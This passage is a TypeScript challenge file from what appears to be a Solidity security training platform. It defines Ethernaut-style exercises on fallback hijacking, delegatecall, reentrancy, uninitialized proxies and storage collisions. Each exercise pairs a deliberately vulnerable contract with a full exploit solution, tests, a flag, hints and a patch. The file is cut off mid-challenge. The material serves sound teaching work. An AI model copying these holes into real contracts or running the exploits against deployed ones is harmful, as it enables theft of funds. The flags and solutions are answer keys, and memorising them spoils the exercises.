import { Challenge } from '../types';

export const CHALLENGES: Challenge[] = [
  // ===========================================================================
  // LEVEL 0: SOLIDITY BASICS (Zero to Hero)
  // ===========================================================================
  {
    id: 'lvl0-fallback-vault',
    slug: 'fallback-access-control',
    title: 'Fallback & Ether Transfers',
    curriculumLevel: 0,
    category: 'access-control',
    difficulty: 'novice',
    xpReward: 100,
    estimatedMinutes: 15,
    swcTag: 'SWC-106',
    cweTag: 'CWE-284',
    solveRatePercent: 95,
    tags: ['receive', 'fallback', 'ether-transfers', 'onlyOwner'],
    theoryExplanation: `### Solidity Ether Transfer & Fallback Execution Flow

In Solidity 0.8+, smart contracts can receive plain Ether transfers via two special functions:

1. **\`receive() external payable\`**:
   - Triggered when plain Ether is sent to the contract address with **empty calldata** (\`msg.data.length == 0\`).
   - Standard transfer methods (\`address.transfer()\`, \`address.send()\`) forward a strict gas stipend of 2300 gas, preventing state modifications.
   - However, modern contracts typically use low-level calls: \`address.call{value: amount}("")\`, which forwards all available gas unless capped!

2. **\`fallback() external payable\`**:
   - Triggered when no matching function selector is found in calldata, OR if \`receive()\` does not exist.

### Security Hazard
If state-changing logic (such as reassigning contract \`owner = msg.sender\`) resides inside \`receive()\` without rigorous checks, any external account or contract can seize administrative privileges by sending a simple 1-wei transaction!`,
    conceptSummary: [
      'receive() triggers strictly on empty calldata transactions',
      'low-level call{value: x}("") forwards all remaining execution gas',
      'Ownership updates should never occur implicitly inside fallback hooks',
      'Always guard state-modifying functions behind explicit access control modifiers',
    ],
    description:
      'FallbackVault holds pooled Ether and allows contributors to donate. The contract designates an owner with withdrawal rights. Can you seize ownership and withdraw all funds?',
    protocolArchitecture:
      'The contract tracks donations in `contributions[msg.sender]`. Its `receive()` hook verifies whether the sender has non-zero prior contributions, and if true, assigns `owner = msg.sender`.',
    exploitObjective:
      '1. Call `contribute()` with a minimal amount of Ether (< 0.001 ETH).\n2. Send plain Ether to the contract to trigger `receive()`, seizing ownership.\n3. Call `withdraw()` to drain the vault balance to 0.',
    targetFileName: 'FallbackVault.sol',
    targetCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title FallbackVault
 * @notice Level 0 Basics: Demonstrates Ether transfer semantics and fallback hijacking.
 */
contract FallbackVault {
    address public owner;
    mapping(address => uint256) public contributions;

    event Contribution(address indexed user, uint256 amount);
    event OwnerChanged(address indexed previousOwner, address indexed newOwner);

    modifier onlyOwner() {
        require(msg.sender == owner, "Caller is not the owner");
        _;
    }

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 ether;
    }

    function contribute() external payable {
        require(msg.value > 0 && msg.value < 0.001 ether, "Contribution must be < 0.001 ether");
        contributions[msg.sender] += msg.value;
        emit Contribution(msg.sender, msg.value);
    }

    function getContribution() external view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() external onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    // VULNERABILITY: receive() overwrites owner if sender contributed previously!
    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0, "Must have prior contributions");
        address previous = owner;
        owner = msg.sender;
        emit OwnerChanged(previous, msg.sender);
    }
}`,
    exploitFileName: 'ExploitFallback.sol',
    exploitInitialCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IFallbackVault {
    function contribute() external payable;
    function withdraw() external;
    function owner() external view returns (address);
}

contract ExploitFallback {
    IFallbackVault public immutable target;
    address public owner;

    constructor(address _target) {
        target = IFallbackVault(_target);
        owner = msg.sender;
    }

    // TODO: Complete the exploit sequence
    function solve() external payable {
        // Step 1: Contribute < 0.001 ether
        
        // Step 2: Trigger receive() with raw Ether transfer
        
        // Step 3: Withdraw all funds as new owner
    }

    receive() external payable {}
}`,
    exploitSolutionCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IFallbackVault {
    function contribute() external payable;
    function withdraw() external;
    function owner() external view returns (address);
}

contract ExploitFallback {
    IFallbackVault public immutable target;
    address public owner;

    constructor(address _target) {
        target = IFallbackVault(_target);
        owner = msg.sender;
    }

    function solve() external payable {
        require(msg.value >= 0.0002 ether, "Need gas + contribution ETH");

        // 1. Establish contribution
        target.contribute{value: 0.0001 ether}();

        // 2. Trigger receive() with empty calldata
        (bool success, ) = address(target).call{value: 0.0001 ether}("");
        require(success, "Receive trigger failed");

        // 3. Drain as newly crowned owner
        target.withdraw();
    }

    receive() external payable {}
}`,
    testFileName: 'ChallengeFallback.t.sol',
    testCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/FallbackVault.sol";
import "../src/ExploitFallback.sol";

contract ChallengeFallbackTest is Test {
    FallbackVault public target;
    ExploitFallback public exploit;
    address public deployer = address(0x1);
    address public attacker = address(0x99);

    function setUp() public {
        vm.prank(deployer);
        target = new FallbackVault();
        vm.deal(address(target), 5 ether);

        vm.deal(attacker, 0.01 ether);
        vm.prank(attacker);
        exploit = new ExploitFallback(address(target));
    }

    function testExploit() public {
        vm.startPrank(attacker);
        exploit.solve{value: 0.0002 ether}();
        vm.stopPrank();

        // Invariants
        assertEq(target.owner(), address(exploit), "Attacker did not take ownership");
        assertEq(address(target).balance, 0, "Vault balance was not drained");
    }
}`,
    flag: 'BLOCKSEC{r3c31v3_f4llb4ck_0wn3rsh1p_j41l}',
    hints: [
      {
        id: 'h-fb-1',
        tier: 1,
        title: 'Examining the receive() requirements',
        costXp: 0,
        content: 'Check the condition inside `receive()`: `require(msg.value > 0 && contributions[msg.sender] > 0)`. How can you satisfy `contributions[msg.sender] > 0` before sending raw ETH?',
      },
      {
        id: 'h-fb-2',
        tier: 2,
        title: 'Sending Empty Calldata',
        costXp: 20,
        content: 'To trigger `receive()` rather than a nonexistent function call, execute `address(target).call{value: amount}("")` with empty string payload.',
      },
      {
        id: 'h-fb-3',
        tier: 3,
        title: 'Executing withdraw()',
        costXp: 30,
        content: 'Once `owner` changes to your contract address, call `target.withdraw()` directly to claim all 5 ETH held in the vault.',
      },
    ],
    historicalCase: {
      protocolName: 'Ethernaut Level 1: Fallback',
      date: 'Classic OpenZeppelin CTF',
      lossUsd: 'Pedagogical Reference',
      summary: 'Demonstrates why contracts must never allow critical state changes (like admin ownership) to be triggered by unconstrained default receive/fallback hooks.',
      referenceUrl: 'https://ethernaut.openzeppelin.com/level/1',
    },
    patchDiff: {
      explanation: 'Remove ownership transfer logic from receive/fallback handlers. Use explicit transferOwnership() functions protected by onlyOwner modifiers.',
      vulnerableCode: `receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender; // VULNERABLE
}`,
      secureCode: `receive() external payable {
    // Pure accounting only, no privilege escalation
    contributions[msg.sender] += msg.value;
}`,
      recommendedBestPractices: [
        'Keep receive() and fallback() strictly for logging or accounting',
        'Never alter administrative roles inside unparameterized hooks',
        'Use OpenZeppelin Ownable2Step for multi-phase ownership transfers',
      ],
    },
  },

  // ===========================================================================
  // LEVEL 1: INTERMEDIATE SECURITY & CTFS (Ethernaut Style)
  // ===========================================================================
  {
    id: 'lvl1-delegation-hijack',
    slug: 'delegation-storage-hijack',
    title: 'Delegation & Storage Hijacking',
    curriculumLevel: 1,
    category: 'low-level',
    difficulty: 'intermediate',
    xpReward: 200,
    estimatedMinutes: 20,
    swcTag: 'SWC-112',
    cweTag: 'CWE-829',
    solveRatePercent: 78,
    tags: ['delegatecall', 'storage-slots', 'fallback', 'msg.data'],
    theoryExplanation: `### The Mechanics of \`delegatecall\`

When Contract A calls Contract B via \`delegatecall\`:
1. **Context Preserved**: The code in Contract B executes using Contract A's **storage, balance, and msg.sender**.
2. **Storage Layout Binding**: Writes to state variables inside Contract B do NOT look up variables by name in Contract A—they write directly to **Storage Slot 0, Slot 1, Slot 2...** of Contract A!

\`\`\`
Caller (Attacker)
   │
   ▼ call("pwn()")
Delegation Contract (Target)
   │ [fallback() triggers delegatecall(msg.data)]
   ▼
Delegate Contract (Code Provider)
   └─ executes "owner = msg.sender" inside Delegation's Slot 0!
\`\`\`

If \`Delegation\` forwards unknown \`msg.data\` to \`Delegate\` via \`delegatecall\`, any caller can trigger functions in \`Delegate\` that manipulate Slot 0 of \`Delegation\`!`,
    conceptSummary: [
      'delegatecall executes code in the context of the caller storage',
      'State variables are resolved strictly by storage slot indices',
      'Unchecked proxy forwarders allow arbitrary selector execution',
    ],
    description:
      'Delegation forwards unrecognized transactions to a helper Delegate contract via delegatecall. Can you exploit storage layout alignment to overwrite Delegation’s owner?',
    protocolArchitecture:
      'Delegation defines `address public owner` at Slot 0 and `Delegate public delegate` at Slot 1. When fallback() executes, it performs `delegate.delegatecall(msg.data)`.',
    exploitObjective:
      'Call Delegation with the 4-byte selector of `pwn()` (0xdd365b8b) to execute `Delegate.pwn()` inside Delegation\'s storage, making your exploit contract the new owner.',
    targetFileName: 'Delegation.sol',
    targetCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate public delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    // VULNERABILITY: Arbitrary delegatecall forwarding!
    fallback() external {
        (bool result, ) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}`,
    exploitFileName: 'ExploitDelegation.sol',
    exploitInitialCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract ExploitDelegation {
    address public immutable target;

    constructor(address _target) {
        target = _target;
    }

    // TODO: Calculate selector for pwn() and trigger Delegation.fallback()
    function hijackOwner() external {
        // Write exploit here...
    }
}`,
    exploitSolutionCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract ExploitDelegation {
    address public immutable target;

    constructor(address _target) {
        target = _target;
    }

    function hijackOwner() external {
        bytes memory payload = abi.encodeWithSignature("pwn()");
        (bool success, ) = target.call(payload);
        require(success, "Exploit failed");
    }
}`,
    testFileName: 'ChallengeDelegation.t.sol',
    testCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Delegation.sol";
import "../src/ExploitDelegation.sol";

contract ChallengeDelegationTest is Test {
    Delegate public delegateContract;
    Delegation public target;
    ExploitDelegation public exploit;
    address public deployer = address(0xAA);
    address public attacker = address(0xBB);

    function setUp() public {
        vm.startPrank(deployer);
        delegateContract = new Delegate(deployer);
        target = new Delegation(address(delegateContract));
        vm.stopPrank();

        vm.startPrank(attacker);
        exploit = new ExploitDelegation(address(target));
        vm.stopPrank();
    }

    function testExploit() public {
        vm.startPrank(attacker);
        exploit.hijackOwner();
        vm.stopPrank();

        assertEq(target.owner(), address(exploit), "Ownership was not hijacked");
    }
}`,
    flag: 'BLOCKSEC{d3l3g4t3c4ll_sl0t0_pwn3d_3th3rn4ut}',
    hints: [
      {
        id: 'h-del-1',
        tier: 1,
        title: 'Selector Encoding',
        costXp: 0,
        content: 'Use `abi.encodeWithSignature("pwn()")` or direct keccak256 hash `bytes4(keccak256("pwn()"))` (0xdd365b8b) to construct the calldata.',
      },
      {
        id: 'h-del-2',
        tier: 2,
        title: 'Calldata Forwarding',
        costXp: 25,
        content: 'When you call `address(target).call(payload)`, the call fails to match any function in `Delegation`, directing execution to `fallback()`.',
      },
      {
        id: 'h-del-3',
        tier: 3,
        title: 'Storage Slot 0 Overwrite',
        costXp: 40,
        content: 'Inside `Delegate.pwn()`, `owner = msg.sender` writes to Slot 0 of the calling contract (`Delegation`), overwriting its owner variable directly!',
      },
    ],
    historicalCase: {
      protocolName: 'Ethernaut Level 6: Delegation',
      date: 'OpenZeppelin Security Classic',
      lossUsd: 'N/A',
      summary: 'Showcases how proxy architectures can accidentally expose sensitive state modification functions if implementation contracts define collision-prone storage layouts.',
      referenceUrl: 'https://ethernaut.openzeppelin.com/level/6',
    },
    patchDiff: {
      explanation: 'Never pass arbitrary msg.data to delegatecall without strict function selector filtering and storage layout alignment validation.',
      vulnerableCode: `fallback() external {
    address(delegate).delegatecall(msg.data); // Arbitrary selector forward
}`,
      secureCode: `// Restrict allowed function selectors or use unstructured proxy slots
fallback() external {
    bytes4 selector = bytes4(msg.data);
    require(isAllowedSelector(selector), "Unauthorized selector");
    address(delegate).delegatecall(msg.data);
}`,
      recommendedBestPractices: [
        'Avoid open delegatecall forwarders in unproxied contracts',
        'Use ERC-1967 unstructured storage slots to isolate implementation variables',
      ],
    },
  },
  {
    id: 'c1-reentrancy-vault',
    slug: 'reentrancy-vault',
    title: 'The DAO Reentrancy Vault',
    curriculumLevel: 1,
    category: 'defi',
    difficulty: 'intermediate',
    xpReward: 150,
    estimatedMinutes: 20,
    swcTag: 'SWC-107',
    cweTag: 'CWE-841',
    solveRatePercent: 88,
    tags: ['reentrancy', 'checks-effects-interactions', 'fallback-hook'],
    theoryExplanation: `### Checks-Effects-Interactions (CEI) Pattern

A contract vulnerability occurs when a program initiates an external call before updating its internal state accounting:
1. **Checks**: Validate conditions (e.g. \`require(balances[msg.sender] >= amount)\`).
2. **Effects**: Mutate state **FIRST** (e.g. \`balances[msg.sender] = 0\`).
3. **Interactions**: Perform external calls **LAST** (e.g. \`msg.sender.call{value: bal}("")\`).

If Interactions occur before Effects, the recipient can intercept execution and re-invoke the withdrawal function repeatedly while \`balances[msg.sender]\` remains non-zero.`,
    conceptSummary: [
      'External calls grant execution control to the recipient contract',
      'Always update contract balances before calling external addresses',
      'Use ReentrancyGuard nonReentrant mutex modifiers',
    ],
    description:
      'EtherStore is an on-chain savings vault allowing users to deposit ETH and withdraw their balance at any time. The protocol claims high security, but its withdrawal accounting violates fundamental EVM execution patterns.',
    protocolArchitecture:
      'EtherStore maintains a mapping `balances[msg.sender]`. During `withdraw()`, it transfers ETH back to the caller using a low-level call before updating the user balance to 0.',
    exploitObjective:
      'Drain all 10 ETH stored in EtherStore using an attacker contract that implements a recursive `receive()` hook, reducing the victim vault balance to 0.',
    targetFileName: 'EtherStore.sol',
    targetCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract EtherStore {
    mapping(address => uint256) public balances;

    event Deposit(address indexed user, uint256 amount);
    event Withdraw(address indexed user, uint256 amount);

    function deposit() external payable {
        require(msg.value > 0, "Deposit must be > 0");
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw() external {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "Zero balance");

        // VULNERABILITY: External call before state update!
        (bool success, ) = msg.sender.call{value: bal}("");
        require(success, "Transfer failed");

        balances[msg.sender] = 0;
        emit Withdraw(msg.sender, bal);
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}`,
    exploitFileName: 'AttackVault.sol',
    exploitInitialCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IEtherStore {
    function deposit() external payable;
    function withdraw() external;
    function getBalance() external view returns (uint256);
}

contract AttackVault {
    IEtherStore public immutable etherStore;
    address public owner;

    constructor(address _etherStoreAddress) {
        etherStore = IEtherStore(_etherStoreAddress);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ether to attack");
        // Write attack logic...
    }

    receive() external payable {
        // Handle reentrant call...
    }
}`,
    exploitSolutionCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IEtherStore {
    function deposit() external payable;
    function withdraw() external;
    function getBalance() external view returns (uint256);
}

contract AttackVault {
    IEtherStore public immutable etherStore;
    address public owner;

    constructor(address _etherStoreAddress) {
        etherStore = IEtherStore(_etherStoreAddress);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ether to attack");
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    receive() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }
}`,
    testFileName: 'ExploitTest.t.sol',
    testCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/EtherStore.sol";
import "../src/AttackVault.sol";

contract ExploitTest is Test {
    EtherStore public etherStore;
    AttackVault public attackVault;
    address public victim1 = address(0x101);
    address public attacker = address(0x999);

    function setUp() public {
        etherStore = new EtherStore();
        
        vm.deal(victim1, 10 ether);
        vm.prank(victim1);
        etherStore.deposit{value: 10 ether}();

        vm.deal(attacker, 1 ether);
        vm.prank(attacker);
        attackVault = new AttackVault(address(etherStore));
    }

    function testExploit() public {
        vm.startPrank(attacker);
        attackVault.attack{value: 1 ether}();
        vm.stopPrank();

        assertEq(address(etherStore).balance, 0, "EtherStore still holds funds");
        assertGe(address(attackVault).balance, 11 ether, "Attacker did not capture funds");
    }
}`,
    flag: 'BLOCKSEC{r33ntr4ncy_c3i_p4tt3rn_br0k3n_2016}',
    hints: [
      {
        id: 'h1-1',
        tier: 1,
        title: 'Checks-Effects-Interactions (CEI) Principle',
        costXp: 0,
        content: 'Examine the order of operations in `EtherStore.withdraw()`. State is updated AFTER the transfer call.',
      },
      {
        id: 'h1-2',
        tier: 2,
        title: 'Contract Fallback Interception',
        costXp: 25,
        content: 'When EtherStore transfers ETH, execution enters AttackVault.receive(). In EtherStore, balances[attacker] is still non-zero!',
      },
      {
        id: 'h1-3',
        tier: 3,
        title: 'Recursive Reentrancy Loop Structure',
        costXp: 50,
        content: 'In `receive()`, loop: `if (address(etherStore).balance >= 1 ether) { etherStore.withdraw(); }`.',
      },
    ],
    historicalCase: {
      protocolName: 'The DAO',
      date: 'June 17, 2016',
      lossUsd: '$60,000,000',
      summary: 'The historic DAO hack utilized recursive call reentrancy to siphon 3.6M ETH into a child contract, leading to the Ethereum hard fork.',
      referenceUrl: 'https://swcregistry.io/docs/SWC-107',
    },
    patchDiff: {
      explanation: 'Update internal state variables before executing external calls, or apply OpenZeppelin nonReentrant modifiers.',
      vulnerableCode: `function withdraw() external {
    uint256 bal = balances[msg.sender];
    (bool success, ) = msg.sender.call{value: bal}("");
    balances[msg.sender] = 0;
}`,
      secureCode: `function withdraw() external nonReentrant {
    uint256 bal = balances[msg.sender];
    balances[msg.sender] = 0; // State updated first
    (bool success, ) = msg.sender.call{value: bal}("");
    require(success, "Transfer failed");
}`,
      recommendedBestPractices: [
        'Adhere strictly to the Checks-Effects-Interactions (CEI) pattern',
        'Use OpenZeppelin ReentrancyGuard',
      ],
    },
  },
  {
    id: 'c3-proxy-ownership',
    slug: 'uninitialized-proxy-ownership',
    title: 'Uninitialized Logic Contract Takeover',
    curriculumLevel: 1,
    category: 'access-control',
    difficulty: 'intermediate',
    xpReward: 200,
    estimatedMinutes: 25,
    swcTag: 'SWC-112',
    cweTag: 'CWE-284',
    solveRatePercent: 72,
    tags: ['uups', 'uninitialized', 'parity-multisig', 'selfdestruct'],
    description:
      'UpgradeableWallet uses the UUPS proxy pattern. While the proxy contract was initialized during deployment, the implementation logic contract itself was left uninitialized.',
    protocolArchitecture:
      'In UUPS proxies, implementation contracts have their own storage space when called directly. Anyone can call initialize(attacker) and trigger selfdestruct.',
    exploitObjective:
      'Claim ownership of the uninitialized WalletLogic implementation contract and trigger destroyWallet() to paralyze proxies relying on this code.',
    targetFileName: 'WalletLogic.sol',
    targetCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract WalletLogic {
    address public owner;
    bool public initialized;

    function initialize(address _owner) external {
        require(!initialized, "Already initialized");
        owner = _owner;
        initialized = true;
    }

    function destroyWallet(address payable recipient) external {
        require(msg.sender == owner, "Caller is not owner");
        selfdestruct(recipient);
    }
}`,
    exploitFileName: 'TakeoverExploit.sol',
    exploitInitialCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IWalletLogic {
    function initialize(address _owner) external;
    function destroyWallet(address payable recipient) external;
}

contract TakeoverExploit {
    IWalletLogic public immutable logicContract;

    constructor(address _logicAddress) {
        logicContract = IWalletLogic(_logicAddress);
    }

    function attack() external {
        // Take ownership and selfdestruct
    }
}`,
    exploitSolutionCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IWalletLogic {
    function initialize(address _owner) external;
    function destroyWallet(address payable recipient) external;
}

contract TakeoverExploit {
    IWalletLogic public immutable logicContract;

    constructor(address _logicAddress) {
        logicContract = IWalletLogic(_logicAddress);
    }

    function attack() external {
        logicContract.initialize(address(this));
        logicContract.destroyWallet(payable(msg.sender));
    }
}`,
    testFileName: 'ExploitTest.t.sol',
    testCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/WalletLogic.sol";
import "../src/TakeoverExploit.sol";

contract ExploitTest is Test {
    WalletLogic public logic;
    TakeoverExploit public exploit;

    function setUp() public {
        logic = new WalletLogic();
        exploit = new TakeoverExploit(address(logic));
    }

    function testExploit() public {
        exploit.attack();
        assertEq(address(logic).code.length, 0, "Logic contract was not destroyed");
    }
}`,
    flag: 'BLOCKSEC{p4r1ty_mullt1s1g_un1n1t14l1z3d_pr0xy_2017}',
    hints: [
      {
        id: 'h3-1',
        tier: 1,
        title: 'Direct Interaction with Logic Contract',
        costXp: 0,
        content: 'Check whether initialize() can be called on the implementation contract directly.',
      },
      {
        id: 'h3-2',
        tier: 2,
        title: 'Becoming Owner',
        costXp: 25,
        content: 'Invoke initialize(address(this)) to set yourself as owner in the logic contract storage.',
      },
      {
        id: 'h3-3',
        tier: 3,
        title: 'Executing selfdestruct',
        costXp: 50,
        content: 'Call destroyWallet() to wipe the bytecode.',
      },
    ],
    historicalCase: {
      protocolName: 'Parity MultiSig Wallet Freeze',
      date: 'November 6, 2017',
      lossUsd: '$150,000,000',
      summary: 'A user invoked initWallet() on the uninitialized Parity library contract and triggered kill(), permanently freezing 513,774 ETH across 587 wallets.',
      referenceUrl: 'https://blog.parity.io/a-postmortem-on-the-parity-multi-sig-library-self-destruct/',
    },
    patchDiff: {
      explanation: 'Call _disableInitializers() in the constructor of implementation contracts.',
      vulnerableCode: `contract WalletLogic {
    function initialize(address _owner) external { ... }
}`,
      secureCode: `contract WalletLogic is Initializable {
    constructor() {
        _disableInitializers(); // Prevents direct initialization
    }
}`,
      recommendedBestPractices: [
        'Call _disableInitializers() in constructors of all implementation contracts',
      ],
    },
  },
  {
    id: 'c5-storage-collision',
    slug: 'storage-collision-delegatecall',
    title: 'Delegatecall Storage Slot Collision',
    curriculumLevel: 1,
    category: 'low-level',
    difficulty: 'advanced',
    xpReward: 350,
    estimatedMinutes: 30,
    swcTag: 'SWC-124',
    cweTag: 'CWE-829',
    solveRatePercent: 44,
    tags: ['delegatecall', 'storage-slots', 'proxy-collision'],
    description:
      'ProxyAccount delegates execution to an upgradeable logic contract. However, slot 0 in the proxy holds implementation address, while slot 0 in the logic holds owner.',
    protocolArchitecture:
      'delegatecall executes in the caller storage context. Calling setOwner(newLogic) on the proxy overwrites slot 0 (implementation pointer).',
    exploitObjective:
      'Call setOwner(attacker) through the proxy to corrupt storage slot 0, hijacking the implementation pointer.',
    targetFileName: 'ProxyAccount.sol',
    targetCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract ProxyAccount {
    address public implementation; // Slot 0
    address public admin;          // Slot 1

    constructor(address _impl) {
        implementation = _impl;
        admin = msg.sender;
    }

    fallback() external payable {
        address impl = implementation;
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}

contract LogicContract {
    address public owner; // Slot 0 collision!
    uint256 public balance;

    function setOwner(address _newOwner) external {
        owner = _newOwner;
    }
}`,
    exploitFileName: 'CollisionExploit.sol',
    exploitInitialCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract CollisionExploit {
    address public immutable proxy;

    constructor(address _proxy) {
        proxy = _proxy;
    }

    function attack(address newLogicAddress) external {
        // Trigger slot 0 collision
    }
}`,
    exploitSolutionCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract CollisionExploit {
    address public immutable proxy;

    constructor(address _proxy) {
        proxy = _proxy;
    }

    function attack(address newLogicAddress) external {
        (bool success, ) = proxy.call(
            abi.encodeWithSignature("setOwner(address)", newLogicAddress)
        );
        require(success, "Collision attack failed");
    }
}`,
    testFileName: 'ExploitTest.t.sol',
    testCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/ProxyAccount.sol";
import "../src/CollisionExploit.sol";

contract ExploitTest is Test {
    ProxyAccount public proxy;
    LogicContract public logic;
    CollisionExploit public exploit;
    address public attackerLogic = address(0xdeadbeef);

    function setUp() public {
        logic = new LogicContract();
        proxy = new ProxyAccount(address(logic));
        exploit = new CollisionExploit(address(proxy));
    }

    function testExploit() public {
        exploit.attack(attackerLogic);
        assertEq(proxy.implementation(), attackerLogic, "Implementation slot was not corrupted");
    }
}`,
    flag: 'BLOCKSEC{st0r4g3_sl0t_c0ll1s10n_d3l3g4t3c4ll_3vm}',
    hints: [
      {
        id: 'h5-1',
        tier: 1,
        title: 'Storage slot alignment',
        costXp: 0,
        content: 'Proxy slot 0 is implementation. LogicContract slot 0 is owner. Calling setOwner alters slot 0.',
      },
      {
        id: 'h5-2',
        tier: 2,
        title: 'ABI signature encoding',
        costXp: 25,
        content: 'Encode setOwner(address) and pass attackerLogic address.',
      },
      {
        id: 'h5-3',
        tier: 3,
        title: 'Executing through Proxy',
        costXp: 50,
        content: 'Call proxy directly; proxy forwards to logic and overwrites implementation.',
      },
    ],
    historicalCase: {
      protocolName: 'Audius Audio Governance Exploit',
      date: 'July 24, 2022',
      lossUsd: '$6,000,000',
      summary: 'Storage slot collision allowed malicious proposal execution and drained 18.5M tokens.',
      referenceUrl: 'https://rekt.news/audius-rekt/',
    },
    patchDiff: {
      explanation: 'Adopt ERC-1967 unstructured storage slots.',
      vulnerableCode: `address public implementation; // Direct slot 0 allocation`,
      secureCode: `bytes32 internal constant _IMPLEMENTATION_SLOT = 
    0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;`,
      recommendedBestPractices: [
        'Use ERC-1967 unstructured storage slots for proxy state',
      ],
    },
  },

  // ===========================================================================
  // LEVEL 2: ADVANCED DEFI & ARCHITECTURE EXPLOITS
  // ===========================================================================
  {
    id: 'c2-oracle-manipulation',
    slug: 'oracle-manipulation',
    title: 'AMM Spot Price Oracle Manipulation',
    curriculumLevel: 2,
    category: 'oracles',
    difficulty: 'advanced',
    xpReward: 250,
    estimatedMinutes: 30,
    swcTag: 'SWC-114',
    cweTag: 'CWE-829',
    solveRatePercent: 64,
    tags: ['flash-loan', 'uniswap-v2', 'spot-oracle', 'twap'],
    theoryExplanation: `### The Vulnerability of Instantaneous Spot Oracles

DeFi protocols requiring asset valuations must never query instantaneous AMM reserves (\`getReserves()\`) directly:
1. **Zero-Capital Flash Loans**: Flash loans allow an attacker to borrow millions in liquidity without collateral.
2. **Atomic Price Distortion**: An attacker swaps enormous volume into the AMM pool within transaction Step 1, skewing the token price by 10x or 100x.
3. **Exploiting Dependent Contracts**: In Step 2, the attacker borrows funds against inflated collateral value.
4. **Restoring Reserves**: In Step 3, the attacker swaps back, pockets the stolen funds, and repays the flash loan.`,
    conceptSummary: [
      'Spot reserves are easily manipulated within single atomic transactions',
      'Always utilize TWAP (Time-Weighted Average Price) or Chainlink feeds',
      'Never calculate collateral values from single-pool reserve balances',
    ],
    description:
      'LendMax is a collateralized borrowing protocol. To determine the USD value of collateral tokens, it queries the instantaneous spot reserves of a single Uniswap v2 pair. An attacker with a flash loan can warp the pool reserves within a single transaction.',
    protocolArchitecture:
      'LendMax computes price as `reserveQuote / reserveBase`. If an attacker dumps base tokens in the AMM, spot price collapses or spikes for that block, allowing undercollateralized loans.',
    exploitObjective:
      'Utilize a flash loan of 1,000,000 USDC to dump into the DEX pool, artificially pumping CollateralToken price, borrow all 500,000 DAI from LendMax, swap back, and repay the flash loan.',
    targetFileName: 'LendMax.sol',
    targetCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IUniswapV2Pair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract LendMax {
    IUniswapV2Pair public immutable pair;
    IERC20 public immutable collateralToken;
    IERC20 public immutable borrowToken;

    mapping(address => uint256) public userCollateral;

    constructor(address _pair, address _collateral, address _borrow) {
        pair = IUniswapV2Pair(_pair);
        collateralToken = IERC20(_collateral);
        borrowToken = IERC20(_borrow);
    }

    function getCollateralPrice() public view returns (uint256) {
        (uint112 r0, uint112 r1, ) = pair.getReserves();
        return (uint256(r1) * 1e18) / uint256(r0);
    }

    function depositCollateral(uint256 amount) external {
        collateralToken.transferFrom(msg.sender, address(this), amount);
        userCollateral[msg.sender] += amount;
    }

    function borrow(uint256 borrowAmount) external {
        uint256 price = getCollateralPrice();
        uint256 collateralValue = (userCollateral[msg.sender] * price) / 1e18;
        uint256 maxBorrow = (collateralValue * 80) / 100;

        require(borrowAmount <= maxBorrow, "Exceeds max borrow allowance");
        borrowToken.transfer(msg.sender, borrowAmount);
    }
}`,
    exploitFileName: 'OracleExploit.sol',
    exploitInitialCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ILendMax {
    function depositCollateral(uint256 amount) external;
    function borrow(uint256 amount) external;
}

interface ISimpleDEX {
